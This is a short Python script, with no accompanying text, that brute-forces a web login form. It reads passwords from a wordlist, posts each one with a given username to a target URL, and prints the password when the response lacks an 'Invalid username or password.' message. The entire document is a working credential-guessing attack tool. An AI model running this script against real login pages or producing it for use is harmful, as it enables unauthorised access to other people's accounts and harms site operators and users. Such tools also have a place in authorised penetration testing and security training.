import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help="Url to the form you want to bruteforce", required=True)
parser.add_argument('-n', '--username',help='username you want to use for bruteforcing', required=True)
parser.add_argument('-w', '--wordlist',help="path to the wordlist", required=True)

args = parser.parse_args()

global FILE_PATH, url, username
FILE_PATH = args.wordlist
url = args.url
username = args.username

def sendReq(username, password):
    password_attempt = password.strip()

    payload = {
        "username": username,
        "password": password_attempt
    }        

    response = requests.post(url, data=payload) 
    if "Invalid username or password." not in response.text:
        print("the password is => ", password_attempt)
        

with open(FILE_PATH, 'r') as file:
    for line in file:
        sendReq(username, line)